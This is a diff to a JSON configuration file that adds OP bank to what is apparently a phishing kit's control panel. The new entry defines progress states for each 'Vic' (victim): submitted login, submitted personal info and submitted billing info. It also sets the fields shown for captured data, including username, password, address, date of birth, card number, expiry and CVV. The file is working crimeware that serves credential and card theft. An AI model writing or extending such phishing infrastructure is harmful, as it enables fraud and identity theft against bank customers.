@@ -97,6 +97,10 @@
       "id": "oberbank"
     },
     {
+      "name": "OP",
+      "id": "opbank"
+    },
+    {
       "name": "Peoples Choice",
       "id": "people"
     },
@@ -504,6 +508,61 @@
       {
         "heading": "Netcode",
         "key": "netcode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "opbank": {
+    "status": [
+      {
+        "status": 1,
+        "meaning": "Vic Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitted Personal Info"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Submitted Billing Info"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "Address",
+        "key": "address"
+      },
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "DOB",
+        "key": "dob"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
       }
     ],
     "mainInfo": [
